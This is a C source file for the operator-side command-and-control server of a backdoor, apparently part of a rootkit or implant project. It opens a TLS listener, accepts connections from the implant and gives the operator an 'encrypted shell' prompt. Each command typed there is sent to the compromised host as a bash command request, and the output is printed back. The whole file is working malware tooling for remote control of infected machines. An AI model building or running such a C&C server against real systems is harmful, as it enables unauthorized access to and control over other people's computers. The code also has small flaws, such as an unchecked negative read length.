// This code is based on the following tutorial:
// https://aticleworld.com/ssl-server-client-using-openssl-in-c/

#include "openssl/err.h"
#include "openssl/ssl.h"
#include <arpa/inet.h>
#include <errno.h>
#include <malloc.h>
#include <netinet/in.h>
#include <resolv.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "../../common/c&c.h"
#include "common.h"

#define FAIL -1

/**
 * @brief Operates input in command shell mode.
 * Returns whether the connection should keep open (0) or not (otherwise)
 * 
 * @param buf 
 * @param ssl 
 * @return int 
 */
int live_command_shell_mode(char* buf, SSL *ssl){
	int is_global_command = manage_global_command(buf, ssl, NULL, NULL);
	if(is_global_command == 1){
		//Already finished then, go to next command input
		return 0;
	}

	//Not a global command, proceeding to analyze in live command shell mode
	int bytes;
	char* request = calloc(4096, sizeof(char));
	strcpy(request, CC_PROT_BASH_COMMAND_REQUEST);
	strcat(request, buf);
	SSL_write(ssl, request, strlen(request));
	
	bytes = SSL_read(ssl, buf, BUFSIZ);
	buf[bytes] = '\0';
	//If valid message in protocol, we proceed to parse it
	if(strncmp(buf, CC_PROT_BASH_COMMAND_RESPONSE, strlen(CC_PROT_BASH_COMMAND_RESPONSE))==0){
		if (bytes > 0) {
			//printf("Reply with:\n[%s]\n", response);
			char *p;
			p = strtok(buf, "#");
			p = strtok(NULL, "#");
			if(p){
				//Print response
				printf("%s\n", p);
			}else{
				printf("[" KRED "ERROR" RESET "]""Could not parse backdoor answer correctly, ignoring\n");
			}
			
		} else {
			ERR_print_errors_fp(stderr);
		}
	}else if(strncmp(buf, CC_PROT_ERR, strlen(CC_PROT_ERR))==0){
		printf("[" KRED "ERROR" RESET "]""Backdoor did not understand the request: %s\n", request);
	}else{
		//If at this point, then we failed to identify the backdoor message
		//We attempt to send a final message indicating we are halting the connection
		printf("[" KRED "ERROR" RESET "]""Backdoor sent unrecognizable message:\n[%s]\n", buf);
		printf("[" KBLU "INFO" RESET "]""Shutting down connection now\n");
		const char *response = CC_PROT_FIN;
		SSL_write(ssl, response, strlen(response));
		return -1;
	}

	//Connection should keep open
	return 0;
}


int server_run(int port) {
	SSL_CTX *ctx;
	int server;
	const char *szPemPublic = "mycert.pem";
	const char *szPemPrivate = "mycert.pem";
	const SSL_METHOD *method;

	if (port < 1024) {
		if (getuid() != 0) {
		printf("This program must be run as root/sudo user since your port # "
				"(%d) is < 1024\n",
				port);
		exit(1);
		}
	}

	SSL_library_init(); /* Initialize the SSL library */

	// InitServerCTX ();
	OpenSSL_add_all_algorithms();     /* load & register all cryptos, etc. */
	SSL_load_error_strings();         /* load all error messages */
	method = TLSv1_2_server_method(); /* create new server-method instance */
	ctx = SSL_CTX_new(method);        /* create new context from method */
	if (ctx == NULL) {
		ERR_print_errors_fp(stderr);
		abort();
	}

	/* set the local certificate from CertFile */
	if (SSL_CTX_use_certificate_file(ctx, szPemPublic, SSL_FILETYPE_PEM) <= 0) {
		ERR_print_errors_fp(stderr);
		abort();
	}

	/* set the private key from KeyFile (may be the same as CertFile) */
	if (SSL_CTX_use_PrivateKey_file(ctx, szPemPrivate, SSL_FILETYPE_PEM) <= 0) {
		ERR_print_errors_fp(stderr);
		abort();
	}

	/* verify private key */
	if (!SSL_CTX_check_private_key(ctx)) {
		fprintf(stderr, "Private key does not match the public certificate\n");
		abort();
	}

	struct sockaddr_in addr;

	server = socket(PF_INET, SOCK_STREAM, 0);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = INADDR_ANY;
	if (bind(server, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
		perror("can't bind port");
		abort();
	}
	if (listen(server, 10) != 0) {
		perror("Can't configure listening port");
		abort();
	}

	for (;;) {
		struct sockaddr_in addr;
		socklen_t len = sizeof(addr);
		SSL *ssl;

		char buf[1024] = {0};
		int sd;

		int client;
		printf("[" KBLU "INFO" RESET "]""Listening for connections\n");
		client = accept(server, (struct sockaddr *)&addr,
						&len); /* accept connection as usual */
		printf("[" KGRN "SUCCESS" RESET "]""Connection established: %s:%d\n", inet_ntoa(addr.sin_addr),
			ntohs(addr.sin_port));
		ssl = SSL_new(ctx);      /* get new SSL state with context */
		SSL_set_fd(ssl, client); /* set connection socket to SSL state */

		if (SSL_accept(ssl) == FAIL){ /* do SSL-protocol accept */
			ERR_print_errors_fp(stderr);
		} else {
			X509 *cert;
			char *line;

			cert = SSL_get_peer_certificate(ssl); /* Get certificates (if available) */
			if (cert != NULL) {
				printf("[" KBLU "INFO" RESET "]""Server certificates:\n");
				line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
				printf("[" KBLU "INFO" RESET "]"
					"Subject: %s\n",
					line);
				free(line);
				line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
				printf("[" KBLU "INFO" RESET "]""Issuer: %s\n",line);
				free(line);
				X509_free(cert);
			} else {
				printf("[" KYLW "WARN" RESET "]""Client has no certificate.\n");
			}

			int connection_terminate = 0;
			printf("[" KBLU "INFO" RESET "]""Live command shell mode active by default\n");
			while(connection_terminate==0){
				char buf[BUFSIZ];
				//Depending on the mode, we show different UI and commands
				switch(client_mode){
					case CLIENT_MODE_LIVE_COMMAND:
						printf(">> client["""KYLW"encrypted shell"RESET"""]>: ");                                                                                                                                                              
						fgets(buf, BUFSIZ, stdin);
						if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
							buf[strlen(buf)-1] = '\0';   
						}
						connection_terminate = live_command_shell_mode(buf, ssl);
						break;
					default:
						printf("Invalid client mode, fatal error, halting\n");
						exit(FAIL);
				}                                                                                                                                                          
			}
		}
		sd = SSL_get_fd(ssl); /* get socket connection */
		//SSL_free(ssl);        /* release SSL state */
		//close(sd);            /* close connection */
	}
	close(server); /* close server socket */

	//ERR_free_strings(); /* free memory from SSL_load_error_strings */
	//EVP_cleanup();      /* free memory from OpenSSL_add_all_algorithms */
	//SSL_CTX_free(ctx);  /* release context */

	return 0;
}
